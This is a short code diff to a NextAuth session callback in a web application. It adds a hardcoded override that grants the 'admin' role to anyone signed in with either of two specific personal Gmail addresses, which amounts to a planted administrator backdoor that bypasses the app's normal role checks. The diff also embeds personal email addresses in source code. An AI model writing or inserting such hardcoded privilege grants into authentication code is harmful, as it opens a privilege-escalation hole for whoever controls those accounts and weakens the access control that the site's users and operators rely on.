@@ -93,6 +93,15 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         session.user.id = token.id as string;
         (session.user as { role?: string }).role = token.role as string;
       }
+      
+      // Hardcoded override to guarantee admin access immediately
+      if (
+        session?.user?.email === "miraclechimdindu2008@gmail.com" || 
+        session?.user?.email === "miraclechimdindu2025@gmail.com"
+      ) {
+        (session.user as any).role = "admin";
+      }
+      
       return session;
     },
   },
